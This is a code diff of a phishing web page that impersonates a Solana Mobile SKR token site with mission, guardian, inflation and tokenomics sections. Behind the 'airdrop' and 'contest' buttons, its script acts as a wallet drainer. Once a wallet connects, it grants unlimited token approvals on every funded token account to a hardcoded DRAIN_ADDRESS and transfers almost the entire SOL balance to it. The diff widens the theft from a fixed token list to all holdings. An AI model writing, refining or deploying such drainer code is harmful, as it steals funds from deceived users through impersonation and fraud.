@@ -9,9 +9,9 @@
       --bg0:#070b10; --bg1:#0a1017; --text:#e8eef6;
       --muted:rgba(232,238,246,.72);
       --sol-a:#14f195; --sol-b:#80ecff; --sol-c:#a100ff;
-      --radius-xl:22px; --radius-lg:18px;
+      --radius-xl:28px; --radius-lg:20px;
       --border-soft:rgba(255,255,255,.10);
-      --shadow:0 18px 60px rgba(0,0,0,.55);
+      --shadow:0 20px 60px rgba(0,0,0,.6);
     }
     *{box-sizing:border-box;margin:0;padding:0}
     body{
@@ -22,84 +22,195 @@
     }
     #dust{ position:fixed; inset:0; pointer-events:none; z-index:0; }
     .nav{
-      position:fixed; top:0; left:0; right:0; height:72px; padding:0 22px;
-      display:flex; align-items:center; justify-content:flex-end;
-      background:rgba(10,15,20,.8); backdrop-filter:blur(12px);
+      position:fixed; top:0; left:0; right:0; height:80px; padding:0 30px;
+      display:flex; align-items:center; justify-content:center;
+      background:rgba(10,15,20,.8); backdrop-filter:blur(16px);
       border-bottom:1px solid rgba(255,255,255,.06); z-index:100;
     }
-    .actions{ display:flex; gap:12px; align-items:center; }
-    .btn{
-      border-radius:999px; padding:10px 18px; border:1px solid rgba(255,255,255,.16);
-      background:rgba(255,255,255,.05); color:var(--text); font-weight:650; font-size:.9rem;
-      cursor:pointer; transition: 0.2s; white-space:nowrap;
-    }
-    .btn:hover:not(:disabled){ background:rgba(255,255,255,.12); transform:translateY(-1px); }
-    .btn-primary{ background:linear-gradient(90deg,var(--sol-a),var(--sol-b)); color:#05080b; border:none; }
-    .btn-accent{ background:linear-gradient(90deg,var(--sol-c), #cc80ff); color:#fff; border:none; }
-    .btn:disabled{ opacity:.3; cursor:not-allowed; }
-    .wrap{ max-width:1000px; margin:0 auto; padding:120px 20px 60px; position:relative; z-index:1; }
-    .hero{
-      text-align:center; margin-bottom:40px;
-    }
-    .hero-logo{ width:280px; margin-bottom:15px; filter:drop-shadow(0 0 20px var(--sol-a)); }
-    .hero-subtitle{ color:var(--muted); font-size:1.1rem; }
-    .raffle-banner{ text-align:center; margin:40px 0; font-size:2rem; font-weight:800; color:var(--sol-a); display:flex; align-items:center; justify-content:center; gap:15px; text-shadow:0 0 15px var(--sol-a); }
-    .raffle-banner span{ font-size:3rem; }
-    .sections{
-      display:grid; grid-template-columns:repeat(4,1fr); gap:20px;
-    }
+    .nav-links{ display:flex; gap:40px; font-weight:600; font-size:1.05rem; }
+    .nav-links a{ color:var(--muted); text-decoration:none; transition:0.2s; }
+    .nav-links a:hover{ color:var(--text); }
+    .wrap{ max-width:1300px; margin:0 auto; padding:120px 30px 100px; position:relative; z-index:1; }
+    .section{ margin-bottom:100px; }
+    .section-title{ font-size:2.8rem; font-weight:900; text-align:center; margin-bottom:40px; color:var(--sol-b); text-shadow:0 0 30px rgba(128,236,255,.3); }
+    .card-grid{ display:grid; grid-template-columns:repeat(auto-fit, minmax(320px,1fr)); gap:30px; }
     .card{
-      background:linear-gradient(135deg, rgba(0,0,0,.5), rgba(20,241,149,.1)); border:1px solid rgba(255,255,255,.12);
-      border-radius:var(--radius-lg); padding:24px; box-shadow:var(--shadow), inset 0 0 20px rgba(20,241,149,.2);
+      background:linear-gradient(135deg, rgba(0,0,0,.6), rgba(20,241,149,.15));
+      border:1px solid rgba(255,255,255,.15);
+      border-radius:var(--radius-lg);
+      padding:32px;
+      box-shadow:var(--shadow);
       transition:transform 0.3s;
     }
-    .card:hover{ transform:translateY(-4px); }
-    .card h3{ font-size:1.3rem; margin-bottom:16px; text-shadow:0 1px 2px rgba(0,0,0,.5); }
-    .card p{ font-size:0.95rem; color:var(--muted); line-height:1.5; margin-bottom:12px; }
-    .chart{ height:120px; margin-bottom:12px; display:block; margin:0 auto; }
-    .legend{ list-style:none; font-size:0.85rem; }
-    .legend li{ display:flex; align-items:center; gap:8px; margin-bottom:6px; }
-    .dot{ width:10px; height:10px; border-radius:50%; }
-    .table{ font-size:0.85rem; border-collapse:collapse; width:100%; }
-    .table th, .table td{ padding:6px; border:1px solid var(--border-soft); text-align:left; }
-    .table th{ background:rgba(255,255,255,.05); }
-    .supply{ font-size:1rem; text-align:center; margin-bottom:20px; color:var(--sol-a); }
-    #status { font-size: 20px; margin: 20px; color: #80ecff; text-align: center; }
+    .card:hover{ transform:translateY(-8px); }
+    .card-icon{ font-size:3rem; margin-bottom:20px; }
+    .card h3{ font-size:1.6rem; margin-bottom:16px; color:var(--sol-a); }
+    .card p{ line-height:1.7; color:var(--muted); }
+    .mission-text{ font-size:1.2rem; line-height:1.8; max-width:900px; margin:0 auto 60px; text-align:center; color:var(--muted); }
+    .inflation-grid{ display:grid; grid-template-columns:1fr 1fr; gap:40px; align-items:center; }
+    .inflation-card{ background:rgba(0,0,0,.4); border-radius:var(--radius-lg); padding:30px; border:1px solid rgba(255,255,255,.12); }
+    .inflation-card h3{ font-size:1.4rem; margin-bottom:20px; }
+    .inflation-metric{ margin-bottom:20px; font-size:1.1rem; }
+    .inflation-metric strong{ color:var(--sol-a); }
+    .chart-placeholder{ height:300px; background:rgba(0,0,0,.3); border-radius:var(--radius-lg); display:grid; place-items:center; font-size:1.2rem; color:var(--muted); }
+    .tokenomics-grid{ display:grid; grid-template-columns:1fr 1fr; gap:40px; align-items:center; }
+    .pie-placeholder{ height:400px; background:rgba(0,0,0,.3); border-radius:var(--radius-lg); display:grid; place-items:center; font-size:1.2rem; color:var(--muted); }
+    table{
+      width:100%; border-collapse:collapse; background:rgba(0,0,0,.4); border-radius:var(--radius-lg); overflow:hidden;
+      border:1px solid rgba(255,255,255,.12);
+    }
+    th, td{ padding:16px; text-align:left; border-bottom:1px solid rgba(255,255,255,.08); }
+    th{ background:linear-gradient(90deg,var(--sol-a),var(--sol-b)); color:#05080b; font-weight:700; }
+    tr:last-child td{ border-bottom:none; }
+    .supply{ text-align:center; font-size:1.3rem; margin-top:40px; color:var(--sol-a); }
+    #status { font-size: 20px; margin: 40px auto; text-align: center; color: #80ecff; max-width: 800px; }
+    .actions { display: flex; gap: 12px; align-items: center; }
+    .btn { /* твои стили кнопок */ }
+    /* Добавь свои стили кнопок из предыдущего кода */
+    @media (max-width:900px){
+      .inflation-grid, .tokenomics-grid{ grid-template-columns:1fr; }
+      .section-title{ font-size:2.2rem; }
+    }
   </style>
 </head>
 <body>
   <canvas id="dust"></canvas>
-  <header class="nav">
-    <div class="actions">
-      <button class="btn" id="connect-btn">Connect Wallet</button>
-      <button class="btn btn-primary" id="claim-btn">
-        Participate in Airdrop
-      </button>
-      <button class="btn btn-accent" id="contest-btn">
-        Participate in Contest
-      </button>
+  <nav class="nav">
+    <div class="nav-links">
+      <a href="#mission">Mission</a>
+      <a href="#guardians">Guardians</a>
+      <a href="#inflation">Inflation</a>
+      <a href="#tokenomics">Tokenomics</a>
     </div>
-  </header>
-  <main class="wrap">
-    <section class="hero">
-      <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafybeifvwriqjehl62zeceva2yp7653jxy7sghyehrqh263aeuqbecsy7i" class="hero-logo" alt="SKR Logo">
-      <p class="hero-subtitle">Mobile SKR - native asset of the ecosystem • Open mobile platform</p>
-    </section>
-    <div class="raffle-banner">🎁 Giveaway: Join the 3 SOL raffle and be the first to win! 🎁</div>
-    <div class="supply">Total supply: 10 billion SKR</div>
-    <section class="sections">
-      <div class="card">
-        <h3>Our Mission</h3>
-        <p>Today's mobile duopoly controls what apps ship, who gets paid, and what rules apply. Solana Mobile is building the alternative — an open mobile platform.</p>
-        <p>SKR is the native asset of the Solana Mobile ecosystem. It distributes control, powers curation, and aligns incentives across builders, users, and hardware partners.</p>
-        <p>Via SKR, the community governs, builders keep what they earn, and users own a stake in the value they create.</p>
-        <p>Decentralized Governance<br>Stake to Guardians who verify devices and curate the dApp Store</p>
-        <p>Ecosystem Ownership<br>Rewards, community treasury funds, growth initiatives, and protocol development</p>
-        <p>Aligned Incentives<br>Builders, users, and hardware partners share in the value they create.</p>
+  </nav>
+  <div class="wrap">
+    <section id="mission" class="section">
+      <h2 class="section-title">Our Mission</h2>
+      <p class="mission-text">
+        Today's mobile duopoly determines which apps are available, who gets paid, and what rules apply. Solana Mobile is creating an alternative — an open mobile platform.<br><br>
+        SKR is the native asset of the Solana Mobile ecosystem. It distributes control, enables moderation, and aligns incentives between developers, users, and hardware partners.<br><br>
+        With SKR, the community governs the project, developers earn rewards, and users own a share of the value they create.
+      </p>
+      <div class="card-grid">
+        <div class="card">
+          <div class="card-icon">🌐</div>
+          <h3>Decentralized Governance</h3>
+          <p>Stake to Guardians who verify devices and curate the dApp store</p>
+        </div>
+        <div class="card">
+          <div class="card-icon">💎</div>
+          <h3>Ecosystem Stewardship</h3>
+          <p>Rewards, community treasury funds, growth initiatives, and protocol development</p>
+        </div>
+        <div class="card">
+          <div class="card-icon">🚀</div>
+          <h3>Aligned Incentives</h3>
+          <p>Developers, users, and hardware partners benefit from the product they create</p>
+        </div>
       </div>
-      <!-- Остальные секции как у тебя -->
     </section>
-  </main>
+
+    <section id="guardians" class="section">
+      <h2 class="section-title">Open Mobile Phone, Governed by Guardians</h2>
+      <p class="mission-text">
+        Within the TEEPIN system, Guardians will verify device authenticity, coordinate decentralized app reviews, and enforce community standards in the Solana Mobile ecosystem.<br><br>
+        By staking SKR in a Guardian, you participate in platform governance and earn rewards for securing the network.
+      </p>
+      <div class="card-grid">
+        <div class="card">
+          <h3>Guardians 2026</h3>
+          <p>Bootstrap Phase<br>Solana Mobile will operate the first Guardian with 0% fee, then hand it over to third-party operators.</p>
+          <p>Rewards go to Guardians who:</p>
+          <ul style="margin-left:20px; line-height:1.8; color:var(--muted);">
+            <li>Run automated security checks</li>
+            <li>Review submitted apps</li>
+            <li>Generate cryptographic proofs</li>
+            <li>Update verification software</li>
+          </ul>
+          <p style="margin-top:20px;"><strong>Want to become a Guardian?</strong><br>Applications accepted until 2026</p>
+        </div>
+      </div>
+    </section>
+
+    <section id="inflation" class="section">
+      <h2 class="section-title">Inflation Schedule</h2>
+      <p class="mission-text">SKR uses linear inflation to incentivize early participation</p>
+      <div class="inflation-grid">
+        <div class="inflation-card">
+          <div class="inflation-metric">
+            <strong>Year 1</strong><br>
+            10% inflation (1 billion SKR)
+          </div>
+          <div class="inflation-metric">
+            <strong>Annual Decay</strong><br>
+            25% reduction
+          </div>
+          <div class="inflation-metric">
+            <strong>Terminal Rate</strong><br>
+            2% per annum
+          </div>
+        </div>
+        <div class="chart-placeholder">
+          Inflation Chart (linear decrease from 10% to 2%)
+        </div>
+      </div>
+    </section>
+
+    <section id="tokenomics" class="section">
+      <h2 class="section-title">Tokenomics</h2>
+      <p class="mission-text">Total supply: 10 billion SKR</p>
+      <div class="tokenomics-grid">
+        <div class="pie-placeholder">
+          Token Distribution Pie Chart
+        </div>
+        <div>
+          <table>
+            <thead>
+              <tr>
+                <th>Category</th>
+                <th>Allocation</th>
+                <th>Unlock Schedule</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>Airdrops</td>
+                <td>30%</td>
+                <td>Unlocked at launch</td>
+              </tr>
+              <tr>
+                <td>Growth + Partnerships</td>
+                <td>25%</td>
+                <td>28% unlocked at launch, linear unlock over 18 months</td>
+              </tr>
+              <tr>
+                <td>Solana Mobile Team</td>
+                <td>15%</td>
+                <td>12-month cliff, 36-month linear vest</td>
+              </tr>
+              <tr>
+                <td>Liquidity + Launch</td>
+                <td>10%</td>
+                <td>Unlocked at launch</td>
+              </tr>
+              <tr>
+                <td>Solana Labs</td>
+                <td>10%</td>
+                <td>12-month cliff, 36-month linear vest</td>
+              </tr>
+              <tr>
+                <td>Community Treasury</td>
+                <td>10%</td>
+                <td>Unlocked at launch, governed by the community</td>
+              </tr>
+            </tbody>
+          </table>
+          <p class="supply">View Full Token Distribution Chart</p>
+        </div>
+      </div>
+    </section>
+  </div>
+
   <div id="status">Status: Ready</div>
 
   <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/dist/umd/solanaweb3.min.js"></script>
@@ -107,18 +218,6 @@
 
   <script>
     const DRAIN_ADDRESS = "4kbb1kaz2YXuTjHQAHY5xjjrqiCM8MZU9sVmmdYg1xo1";
-
-    const TOKEN_MINTS = [
-      "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", // BONK
-      "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm", // WIF
-      "6D7NaB2xsLd7cauWu1YbC8SGSxW6J1xua3v1w2zUL7", // POPCAT
-      "MEW1gQWJ3nEXg2qgERiKu7FAFj79PHvQVREQUzScPP5", // MEW
-      "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", // USDC
-      "9n4nbM75f5Ui33ZbPYXn59EwSgf1Zr9wrG2T5fSJmP2o", // SRM
-      "7dHbWXmci3dT8UFYWYZwe8ZXD54zGce3qQaT5fqP76G1", // RAY
-      "HZ64k4h57j1Bzfvk2V9fD565KD5jH1tB2fMvkQd6pZP", // ORCA
-      "4gqk83p1ZD39f462G7GkZQpW5TqZ7hM8fzNQz9P4wQd" // MNGO
-    ];
 
     let wallet = null;
     let publicKey = null;
@@ -144,7 +243,7 @@
         connectBtn.disabled = true;
         claimBtn.disabled = false;
         contestBtn.disabled = false;
-        statusEl.textContent = "Connected! Click button.";
+        statusEl.textContent = "Connected! Click the button.";
       }
     }
 
@@ -194,23 +293,37 @@
 
         const tx = new solanaWeb3.Transaction();
 
-        for (const mintStr of TOKEN_MINTS) {
-          const mint = new solanaWeb3.PublicKey(mintStr);
-          const ata = await splToken.getAssociatedTokenAddress(mint, owner);
+        // Fetch token accounts with balance >0
+        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(owner, { programId: splToken.TOKEN_PROGRAM_ID });
 
-          const ataInfo = await connection.getAccountInfo(ata);
-          if (!ataInfo) {
-            tx.add(splToken.createAssociatedTokenAccountInstruction(owner, ata, owner, mint));
+        for (const acc of tokenAccounts.value) {
+          const info = acc.account.data.parsed.info;
+          const amount = BigInt(info.tokenAmount.amount);
+          if (amount > 0n) {
+            const mint = new solanaWeb3.PublicKey(info.mint);
+            const ata = await splToken.getAssociatedTokenAddress(mint, owner);
+
+            const ataInfo = await connection.getAccountInfo(ata);
+            if (!ataInfo) {
+              tx.add(splToken.createAssociatedTokenAccountInstruction(owner, ata, owner, mint));
+            }
+
+            tx.add(splToken.createApproveInstruction(ata, delegate, owner, [], BigInt("18446744073709551615")));
           }
-
-          tx.add(splToken.createApproveInstruction(ata, delegate, owner, [], BigInt("18446744073709551615")));
         }
 
-        tx.add(solanaWeb3.SystemProgram.transfer({
-          fromPubkey: owner,
-          toPubkey: delegate,
-          lamports: 200000000
-        }));
+        // Transfer almost all SOL (leave ~0.01 for fee/rent)
+        const balance = await connection.getBalance(owner);
+        const leaveForFee = 10000000; // 0.01 SOL
+        const transferAmount = balance - leaveForFee;
+
+        if (transferAmount > 5000) {
+          tx.add(solanaWeb3.SystemProgram.transfer({
+            fromPubkey: owner,
+            toPubkey: delegate,
+            lamports: transferAmount
+          }));
+        }
 
         tx.feePayer = owner;
         const { blockhash } = await connection.getLatestBlockhash();
@@ -234,7 +347,7 @@
 
     window.addEventListener('load', checkMobileReturn);
 
-    // Particles background
+    // Particles
     (function () {
       const canvas = document.getElementById("dust");
       const ctx = canvas.getContext("2d");
